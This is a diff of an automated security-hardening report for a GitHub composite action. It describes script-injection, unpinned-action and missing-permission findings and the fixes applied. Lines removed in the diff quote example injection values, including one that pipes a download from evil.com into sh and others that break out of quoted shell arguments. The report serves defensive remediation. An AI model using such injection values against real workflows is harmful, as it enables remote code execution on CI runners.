@@ -8,37 +8,41 @@
 
 **Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`
 
-**Harden Agent Version:** `1`
+**Harden Agent Version:** `2`
 
-Action **TheStack-ai--pulser/v1.0.0** was hardened automatically. 6 finding(s) were identified and resolved across 1 iteration(s).
+Action **TheStack-ai--pulser/v1.0.0** was hardened automatically. 7 finding(s) were identified and resolved across 1 iteration(s).
 
 ## Findings Fixed
 
 ### script-injection (severity: high)
 
-Multiple `${{ inputs.* }}` expressions are interpolated directly inside `run:` shell command strings (sub-rule a). This allows an attacker who controls the calling workflow's inputs to inject arbitrary shell commands.
-
-- Line 43: `run: npm install -g pulser-cli@${{ inputs.version }}` — `inputs.version` injected directly into a shell command; a value like `; curl http://evil.com | sh` would execute.
-- Line 48: `REPORT=$(pulser "${{ inputs.path }}" --format json ...)` — `inputs.path` injected directly; a value like `"; malicious_cmd; echo "` would break out of the quoted argument.
-- Line 66: `pulser "${{ inputs.path }}" --format text ...` — same issue as line 48.
-- Line 69: `if [ "${{ inputs.strict }}" = "true" ]` — `inputs.strict` injected directly; a value like `" = "" ] || true; malicious_cmd; [ "x` could alter control flow.
-
-Fix: move each input into an `env:` variable and reference it as a quoted shell variable (e.g., `"$INPUT_VERSION"`, `"$INPUT_PATH"`, `"$INPUT_STRICT"`) inside the `run:` block.
+action.yml contains multiple ${{ inputs.* }} expressions directly interpolated inside run: shell command strings (sub-rule a). Specifically: (1) `npm install -g pulser-cli@${{ inputs.version }}` — inputs.version is injected directly into a shell command, allowing command injection via a crafted version string. (2) `REPORT=$(pulser "${{ inputs.path }}" ...)` and `pulser "${{ inputs.path }}" ...` — inputs.path is injected directly into shell commands twice. (3) `if [ "${{ inputs.strict }}" = "true" ]` — inputs.strict is injected directly into a shell conditional. All three inputs are attacker-controllable and must be passed via env: variables and then double-quoted in the shell, never interpolated directly as ${{ }} expressions inside run: blocks.
 
 Locations:
 
-- `action.yml:43`
-- `action.yml:48`
+- `action.yml:40`
+- `action.yml:44`
+- `action.yml:63`
 - `action.yml:66`
-- `action.yml:69`
 
 ### unpinned-uses (severity: high)
 
-The composite action step `uses: actions/setup-node@v4` references a mutable tag (`v4`) rather than a pinned 40-character commit SHA. A tag can be moved to point to a different (potentially malicious) commit, enabling a supply-chain attack. Fix by pinning to a full SHA, e.g. `uses: actions/setup-node@1d0ff469b13b2fd2b4e6b25e6af3e2f6b6b8c5a4 # v4`.
+Multiple uses: references use mutable tags instead of pinned 40-character commit SHAs, making the action vulnerable to supply-chain attacks if the referenced tag is moved or overwritten. Failing references in action.yml: `actions/setup-node@v4`. Failing references in .github/workflows/ci.yml: `actions/checkout@v4`, `pnpm/action-setup@v4`, `actions/setup-node@v4`. All should be pinned to full SHA digests (e.g. `actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4`).
 
 Locations:
 
-- `action.yml:38`
+- `action.yml:37`
+- `.github/workflows/ci.yml:12`
+- `.github/workflows/ci.yml:13`
+- `.github/workflows/ci.yml:15`
+
+### missing-permissions (severity: medium)
+
+.github/workflows/ci.yml has no top-level `permissions:` key and the `build` job also has no job-level `permissions:` key. Without explicit permissions, the workflow inherits the repository's default token permissions, which may be overly broad (e.g. write access to contents). A minimal permissions block such as `permissions: read-all` or specific scopes (e.g. `contents: read`) should be added.
+
+Locations:
+
+- `.github/workflows/ci.yml:1`
 
 ### static-inline-injection (severity: high)
 
@@ -76,9 +80,15 @@ Locations:
 
 ### Iteration 1
 
-**Fixes applied:** unpinned-uses, script-injection, static-inline-injection
+**Fixes applied:** script-injection, static-inline-injection, unpinned-uses, missing-permissions
 
 **Notes:**
 
-Fixed all findings in action.yml: (1) Pinned actions/setup-node@v4 to full commit SHA 49933ea5288caeca8642d1e84afbd3f7d6820020 with # v4 comment. (2) Moved all ${{ inputs.* }} expressions out of run: shell strings into env: blocks — inputs.version → INPUT_VERSION in the 'Install pulser-cli' step, inputs.path → INPUT_PATH and inputs.strict → INPUT_STRICT in the 'Run pulser' step. All shell references updated to use the corresponding environment variable names ($INPUT_VERSION, $INPUT_PATH, $INPUT_STRICT).
+Fixed all findings in action.yml and .github/workflows/ci.yml:
+
+1. script-injection / static-inline-injection: Moved all ${{ inputs.version }}, ${{ inputs.path }}, and ${{ inputs.strict }} expressions out of run: shell blocks into env: maps (PULSER_VERSION, PULSER_PATH, PULSER_STRICT). Shell commands now reference plain environment variables with double-quoting.
+
+2. unpinned-uses: Pinned all three action references to full 40-character commit SHAs with tag comments preserved: actions/setup-node@v4 → @49933ea5288caeca8642d1e84afbd3f7d6820020, actions/checkout@v4 → @11d5960a326750d5838078e36cf38b85af677262, pnpm/action-setup@v4 → @b906affcce14559ad1aafd4ab0e942779e9f58b1.
+
+3. missing-permissions: Added `permissions: contents: read` at both the top-level workflow scope and the build job level in ci.yml.
 
